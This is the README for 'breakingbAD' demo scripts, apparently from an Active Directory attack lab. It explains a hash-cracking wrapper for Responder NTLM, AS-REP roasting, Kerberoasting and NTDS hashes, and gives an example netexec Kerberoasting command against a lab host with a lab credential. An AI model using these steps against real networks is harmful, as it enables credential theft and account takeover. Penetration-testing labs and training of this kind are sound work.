# breakingbAD Demo Scripts

Quick hash cracking for lab demonstrations.

## hashcrack.sh

Auto-detect and crack captured hashes from the lab.

### Usage

```bash
# Interactive menu
./hashcrack.sh

# Crack specific hash type
./hashcrack.sh ntlmv1      # NTLMv1 (mode 5500)
./hashcrack.sh ntlmv2      # NTLMv2 (mode 5600)
./hashcrack.sh asreproast  # AS-REP (mode 18200)
./hashcrack.sh kerberoast  # TGS-REP (mode 13100)
./hashcrack.sh ntds        # NTLM from NTDS (mode 1000)

# Crack all available
./hashcrack.sh all

# List hash files
./hashcrack.sh list
```

### Hash File Locations

Save captured hashes to `~/breakingbAD/demo/hashes/`:

| Attack | Output File | Hashcat Mode |
|--------|-------------|--------------|
| Responder NTLMv1 | `ntlmv1.txt` | 5500 |
| Responder NTLMv2 | `ntlmv2.txt` | 5600 |
| ASREPRoasting | `asreproast.txt` | 18200 |
| Kerberoasting | `kerberoast.txt` | 13100 |
| NTDS dump | `ntds.txt` | 1000 |

### Example Workflow

```bash
# 1. Capture hashes (see CHEATSHEET.md for commands)
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting ~/breakingbAD/demo/hashes/kerberoast.txt

# 2. Crack them
~/breakingbAD/demo/hashcrack.sh kerberoast

# 3. Check results
cat ~/breakingbAD/demo/cracked/kerberoast_cracked.txt
```

### Wordlist

Uses `/usr/share/john/password.lst` which includes lab passwords for demo purposes.
